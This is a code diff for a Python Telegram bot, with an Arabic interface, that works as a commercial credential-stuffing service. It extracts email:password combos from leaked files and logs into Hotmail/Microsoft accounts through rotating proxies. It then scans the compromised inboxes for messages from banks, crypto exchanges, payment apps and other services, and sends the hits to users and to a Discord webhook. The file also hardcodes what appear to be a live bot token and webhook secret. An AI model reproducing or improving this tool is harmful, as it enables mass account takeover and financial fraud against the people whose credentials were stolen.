@@ -4,32 +4,45 @@ import re
 import time
 import sqlite3
 import json
-import aiohttp
-import urllib3
 import random
 import threading
 from datetime import datetime, timedelta
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
-from flask import Flask, jsonify
 
-# Disable insecure request warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Check aiohttp availability
+try:
+    import aiohttp
+except ImportError:
+    print("[FATAL] aiohttp is not installed! Run: pip install aiohttp")
+    raise
+
+try:
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+except ImportError:
+    urllib3 = None
+
+try:
+    from flask import Flask, jsonify
+except ImportError:
+    print("[FATAL] Flask is not installed! Run: pip install flask")
+    raise
 
 # ═══════════════════════════════════════════════════════════
 # CONFIGURATION
 # ═══════════════════════════════════════════════════════════
-API_TOKEN = "8814848831:AAEo3Ui19kB30X93-Cuzugzoi4rdfvpwCjw"
-ADMIN_ID = 8703458182
-ADMIN_USERNAME = "lxhds"
-CHANNEL_USERNAME = "@lsueusuds"
-CHANNEL_URL = "https://t.me/lsueusuds"
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544679115054129282/9BRgzgVo7ipiW6rhxfaECuQDl9vytlVg0ZojCt0_NuLNgMjIh0kDda1EhyVPNvooi5CO"
+API_TOKEN = os.environ.get("BOT_TOKEN", "8814848831:AAEo3Ui19kB30X93-Cuzugzoi4rdfvpwCjw")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "8703458182"))
+ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "lxhds")
+CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "lsueusuds")
+CHANNEL_URL = os.environ.get("CHANNEL_URL", "https://t.me/lsueusuds")
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1544679115054129282/9BRgzgVo7ipiW6rhxfaECuQDl9vytlVg0ZojCt0_NuLNgMjIh0kDda1EhyVPNvooi5CO")
 
 bot = AsyncTeleBot(API_TOKEN)
 
 # ═══════════════════════════════════════════════════════════
-# FLASK APP (Web Server)
+# FLASK APP (Web Server for Render keepalive)
 # ═══════════════════════════════════════════════════════════
 app = Flask(__name__)
 
@@ -72,7 +85,8 @@ def stats():
 def run_flask():
     port = int(os.environ.get('PORT', 8080))
     print(f"[*] Flask server starting on port {port}...")
-    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    # Use threaded=True for Render compatibility
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
 
 # ═══════════════════════════════════════════════════════════
 # EMOJI
@@ -217,7 +231,6 @@ LANGS = {
 # SERVICES DATABASE - 60+ PLATFORMS
 # ═══════════════════════════════════════════════════════════
 SV = {
-    # Gaming - Original
     "noreply@id.supercell.com": "Supercell",
     "security@mail.instagram.com": "Instagram",
     "security@facebookmail.com": "Facebook",
@@ -231,7 +244,6 @@ SV = {
     "noreply@accts.krafton.com": "PUBG Mobile",
     "yallaludo_account@support.yalla.live": "YALLA LUDO",
     "service@mail.yallapay.live": "YALLA PAY",
-    # Gaming - New
     "noreply@playstation.com": "PlayStation",
     "noreply@nintendo.com": "Nintendo",
     "noreply@blizzard.com": "Blizzard",
@@ -263,7 +275,6 @@ SV = {
     "noreply@nianticlabs.com": "Niantic",
     "noreply@pokemongo.com": "Pokemon GO",
     "noreply@ingress.com": "Ingress",
-    # Social - New
     "no-reply@accounts.google.com": "Google",
     "noreply@apple.com": "Apple",
     "noreply@snapchat.com": "Snapchat",
@@ -275,7 +286,6 @@ SV = {
     "noreply@telegram.org": "Telegram",
     "noreply@whatsapp.com": "WhatsApp",
     "noreply@skype.com": "Skype",
-    # Streaming - New
     "noreply@spotify.com": "Spotify",
     "noreply@disneyplus.com": "Disney+",
     "noreply@hulu.com": "Hulu",
@@ -285,7 +295,6 @@ SV = {
     "noreply@youtube.com": "YouTube",
     "noreply@funimation.com": "Funimation",
     "noreply@vrv.co": "VRV",
-    # Tech - New
     "noreply@github.com": "GitHub",
     "noreply@dropbox.com": "Dropbox",
     "noreply@adobe.com": "Adobe",
@@ -301,13 +310,11 @@ SV = {
     "noreply@hostinger.com": "Hostinger",
     "noreply@bluehost.com": "Bluehost",
     "noreply@shopify.com": "Shopify",
-    # Shopping - New
     "account@amazon.com": "Amazon",
     "service@paypal.com": "PayPal",
     "noreply@ebay.com": "eBay",
     "noreply@aliexpress.com": "AliExpress",
     "noreply@etsy.com": "Etsy",
-    # Finance/Crypto - New
     "noreply@binance.com": "Binance",
     "noreply@coinbase.com": "Coinbase",
     "noreply@kraken.com": "Kraken",
@@ -320,18 +327,15 @@ SV = {
     "noreply@venmo.com": "Venmo",
     "noreply@cash.app": "Cash App",
     "noreply@westernunion.com": "Western Union",
-    # AI - New
     "noreply@openai.com": "ChatGPT/OpenAI",
     "noreply@anthropic.com": "Claude/Anthropic",
     "noreply@midjourney.com": "Midjourney",
     "noreply@stability.ai": "Stable Diffusion",
-    # Travel - New
     "noreply@airbnb.com": "Airbnb",
     "noreply@booking.com": "Booking.com",
     "noreply@expedia.com": "Expedia",
     "noreply@uber.com": "Uber",
     "noreply@lyft.com": "Lyft",
-    # Banks
     "noreply@chase.com": "Chase",
     "noreply@bankofamerica.com": "Bank of America",
     "noreply@wellsfargo.com": "Wells Fargo",
@@ -349,7 +353,6 @@ active_checks = {}
 DB_FILE = "database.db"
 PROXIES_DIR = "proxies"
 
-# Valid fields for update (SQL injection prevention)
 VALID_USER_FIELDS = {
     "username", "lang", "is_vip", "vip_expiry", "banned",
     "free_uses", "last_reset", "last_extracted_file"
@@ -397,7 +400,6 @@ def init_db():
     """)
     conn.commit()
     conn.close()
-    # Create proxies directory
     if not os.path.exists(PROXIES_DIR):
         os.makedirs(PROXIES_DIR)
 
@@ -413,9 +415,7 @@ def get_user_by_id_or_username(identifier):
         cursor.execute("SELECT chat_id FROM users WHERE LOWER(username) = ?", (identifier,))
     row = cursor.fetchone()
     conn.close()
-    if row:
-        return row[0]
-    return None
+    return row[0] if row else None
 
 def get_user(chat_id, username=None):
     chat_id = int(chat_id)
@@ -523,7 +523,7 @@ def count_user_proxies(chat_id):
             with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
                     line = line.strip()
-                    if line and ':' in line:
+                    if line and ':' in line and not line.startswith('#'):
                         count += 1
         except:
             pass
@@ -541,19 +541,14 @@ class ProxyManager:
         self.load_proxies()
 
     def load_proxies(self):
-        """Load proxies from user's saved files or global proxies directory"""
         self.proxies = []
         files_to_load = []
-
         if self.chat_id:
             files_to_load = get_user_proxy_files(self.chat_id)
-
-        # Also load from global proxies directory
         if os.path.exists(PROXIES_DIR):
             for f in os.listdir(PROXIES_DIR):
                 if f.endswith('.txt'):
                     files_to_load.append(os.path.join(PROXIES_DIR, f))
-
         for fp in set(files_to_load):
             if not os.path.exists(fp):
                 continue
@@ -563,14 +558,11 @@ class ProxyManager:
                         line = line.strip()
                         if not line or line.startswith('#'):
                             continue
-                        # Normalize proxy format
                         proxy = self._normalize_proxy(line)
                         if proxy:
                             self.proxies.append(proxy)
             except Exception as e:
                 print(f"[!] Error loading proxy file {fp}: {e}")
-
-        # Remove duplicates while preserving order
         seen = set()
         unique = []
         for p in self.proxies:
@@ -581,27 +573,19 @@ class ProxyManager:
         print(f"[*] Loaded {len(self.proxies)} unique proxies")
 
     def _normalize_proxy(self, proxy_str):
-        """Normalize proxy string to aiohttp format"""
         proxy_str = proxy_str.strip()
         if not proxy_str:
             return None
-
-        # If already has protocol
         if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
             return proxy_str
-
-        # If format is ip:port
         if ':' in proxy_str and not proxy_str.startswith('http'):
-            # Check if it has auth user:pass@ip:port
             if '@' in proxy_str:
                 return f"http://{proxy_str}"
             else:
                 return f"http://{proxy_str}"
-
         return None
 
     async def get_proxy(self):
-        """Get a random alive proxy"""
         async with self.lock:
             available = [p for p in self.proxies if p not in self.dead_proxies]
             if not available:
@@ -609,7 +593,6 @@ class ProxyManager:
             return random.choice(available)
 
     async def mark_dead(self, proxy):
-        """Mark a proxy as dead"""
         async with self.lock:
             self.dead_proxies.add(proxy)
             print(f"[!] Proxy marked dead: {proxy[:30]}...")
@@ -684,7 +667,6 @@ class AsyncHotmailChecker:
         self.last_update = 0
         self.combo_file = None
         self.hits_file = None
-        # Concurrency control - adjust based on proxy count
         max_concurrent = 20 if (proxy_manager and proxy_manager.has_proxies()) else 5
         self.semaphore = asyncio.Semaphore(max_concurrent)
 
@@ -696,7 +678,6 @@ class AsyncHotmailChecker:
         return f"[{bar}] {percentage:.1f}%"
 
     async def _check_account(self, username, password, session, max_retries=3):
-        """Check single account with proxy rotation and retry logic"""
         if self.cancelled:
             return "CANCELLED"
 
@@ -706,7 +687,6 @@ class AsyncHotmailChecker:
                 proxy_url = await self.proxy_manager.get_proxy()
 
             try:
-                # Step 1: Login to Microsoft
                 login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
                 payload = {
                     'ps': '2', 'psRNGCDefaultType': '', 'psRNGCEntropy': '', 'psRNGCSLK': '',
@@ -739,7 +719,6 @@ class AsyncHotmailChecker:
                     cookies = response.cookies
                     response_headers = response.headers
 
-                # Check for immediate failures
                 if "Your account or password is incorrect." in response_text or \
                    "That Microsoft account doesn't exist." in response_text or \
                    "Sign in to your Microsoft account" in response_text:
@@ -778,7 +757,6 @@ class AsyncHotmailChecker:
                 if not refresh_token:
                     return "BAD"
 
-                # Step 2: Get access token
                 token_url = "https://login.live.com/oauth20_token.srf"
                 token_payload = {
                     'grant_type': 'refresh_token',
@@ -808,7 +786,6 @@ class AsyncHotmailChecker:
                     except:
                         return "BAD"
 
-                # Step 3: Search emails for services
                 outlook_headers = {
                     'User-Agent': 'Outlook-Android/2.0',
                     'Pragma': 'no-cache',
@@ -922,7 +899,6 @@ class AsyncHotmailChecker:
         return "RETRY"
 
     async def check_account(self, username, password, session):
-        """Wrapper with semaphore and stats tracking"""
         async with self.semaphore:
             if self.cancelled:
                 return "CANCELLED"
@@ -948,7 +924,6 @@ class AsyncHotmailChecker:
                 self.last_update = now
                 await self.update_status()
 
-            # Small delay to avoid overwhelming servers
             await asyncio.sleep(0.05)
             return result
 
@@ -996,13 +971,11 @@ class AsyncHotmailChecker:
         if self.total == 0:
             return
 
-        # Use shared session for connection pooling
         timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             tasks = [self.check_account(u, p, session) for u, p in combos]
             await asyncio.gather(*tasks, return_exceptions=True)
 
-        # Save results
         if self.hit_results:
             hits_file = f"Hotmail_Hits_{self.chat_id}_{int(time.time())}.txt"
             with open(hits_file, "w", encoding="utf-8") as f:
@@ -1098,10 +1071,8 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
         await bot.edit_message_text(f"{EMOJI['no']} <b>لا يوجد كومبو صالح في الملف.</b>", chat_id, msg_id, parse_mode='HTML')
         return
 
-    # Initialize proxy manager for this user
     proxy_manager = ProxyManager(chat_id)
     if not proxy_manager.has_proxies():
-        # Try loading global proxies
         proxy_manager = ProxyManager(None)
 
     checker = AsyncHotmailChecker(chat_id, bot, proxy_manager)
@@ -1114,7 +1085,6 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
     try:
         await checker.run_check(file_path, status_msg.message_id)
 
-        # Send results
         elapsed = time.time() - checker.start_time
         done_text = t['hotmail_done'].format(
             hits=checker.hits, twofactor=checker.twofactor, custom=checker.custom,
@@ -1124,12 +1094,10 @@ async def start_hotmail_check(chat_id, file_path, msg_id):
         markup = get_main_menu_markup(user, chat_id)
         await bot.edit_message_text(done_text, chat_id, status_msg.message_id, parse_mode='HTML', reply_markup=markup)
 
-        # Send hits file if exists
         if checker.hits_file and os.path.exists(checker.hits_file):
             with open(checker.hits_file, "rb") as f:
                 await bot.send_document(chat_id, f, caption=f"{EMOJI['fire']} <b>Hotmail Hits - {checker.hits} accounts</b>", parse_mode='HTML')
 
-            # Send to Discord
             user_info = f"@{user['username']}" if user.get('username') else f"ID:{chat_id}"
             platforms_str = ", ".join(checker.all_platforms) if checker.all_platforms else "None"
             discord_ok = await send_file_to_discord(
@@ -1412,7 +1380,6 @@ async def proxy_clear_handler(call):
     clear_user_proxies(chat_id)
     await bot.answer_callback_query(call.id, t['proxy_cleared'], show_alert=True)
 
-    # Refresh menu
     proxy_count = 0
     text = t['proxy_welcome'].format(count=proxy_count)
     markup = InlineKeyboardMarkup()
@@ -1485,14 +1452,12 @@ async def handle_link(message: Message):
     t = LANGS[lang]
     file_url = message.text.strip()
 
-    # Check free uses
     if not user["is_vip"] and user["free_uses"] <= 0:
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton(t['upgrade_vip'], callback_data="buy_vip"))
         await bot.reply_to(message, t['free_exhausted'], reply_markup=markup, parse_mode='HTML')
         return
 
-    # Try to get file info
     try:
         async with aiohttp.ClientSession() as session:
             async with session.head(file_url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=30)) as resp:
@@ -1508,7 +1473,6 @@ async def handle_link(message: Message):
         await bot.reply_to(message, f"{t['invalid_link']}\n<code>{e}</code>", parse_mode='HTML')
         return
 
-    # Format file size
     if filesize > 1024*1024*1024:
         size_str = f"{filesize/(1024*1024*1024):.2f} GB"
     elif filesize > 1024*1024:
@@ -1518,7 +1482,6 @@ async def handle_link(message: Message):
     else:
         size_str = f"{filesize} B"
 
-    # Store state
     user_states[chat_id] = {
         "step": "link_ready",
         "file_url": file_url,
@@ -1527,7 +1490,6 @@ async def handle_link(message: Message):
         "platform": "all"
     }
 
-    # Show file info and options
     text = t['link_info_title'].format(filename=filename, filesize=size_str)
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton(t['combo_btn'], callback_data="extract_combo"))
@@ -1781,20 +1743,17 @@ async def start_url_processing(chat_id, msg_id):
         with open(combo_filename, "w", encoding="utf-8") as f:
             f.write("\n".join(matched_list))
 
-        # Save to user record
         update_user_field(chat_id, "last_extracted_file", combo_filename)
 
         await bot.send_message(chat_id, success_msg, parse_mode='HTML')
         with open(combo_filename, "rb") as cf:
             await bot.send_document(chat_id, cf, caption=f"{EMOJI['fire']} <b>Pure ULP Combo Results for</b> `{target_info}`\n{EMOJI['box']} <b>Total unique items:</b> {len(matched_list)}", parse_mode='HTML')
 
-        # Send auto-check button
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton(t['hotmail_auto_btn'], callback_data="hotmail_auto_check"))
         markup.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_home"))
         await bot.send_message(chat_id, f"{EMOJI['flame']} <b>هل تريد فحص Hotmail تلقائياً لهذا الملف؟</b>", reply_markup=markup, parse_mode='HTML')
 
-        # Send to Discord
         user_info = f"@{user['username']}" if user.get('username') else f"ID:{chat_id}"
         discord_ok = await send_file_to_discord(
             file_path=combo_filename,
@@ -1840,12 +1799,10 @@ async def handle_document(message: Message):
         file_info = await bot.get_file(doc.file_id)
         downloaded_file = await bot.download_file(file_info.file_path)
 
-        # Save to proxies directory with user ID
         file_path = os.path.join(PROXIES_DIR, f"proxies_{chat_id}_{int(time.time())}.txt")
         with open(file_path, 'wb') as f:
             f.write(downloaded_file)
 
-        # Count valid proxies
         valid_count = 0
         try:
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
@@ -1879,7 +1836,6 @@ async def handle_document(message: Message):
         with open(file_path, 'wb') as f:
             f.write(downloaded_file)
 
-        # Count lines
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             lines = sum(1 for line in f if ':' in line and '@' in line)
 
@@ -1894,14 +1850,12 @@ async def handle_document(message: Message):
         await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
         return
 
-    # Default: ignore documents outside of expected flow
     await bot.reply_to(message, f"{EMOJI['warning']} <b>يرجى استخدام الأزرار أو إرسال رابط مباشر.</b>", parse_mode='HTML')
 
 # ═══════════════════════════════════════════════════════════
 # MAIN
 # ═══════════════════════════════════════════════════════════
 async def main():
-    # Start Flask in background thread
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
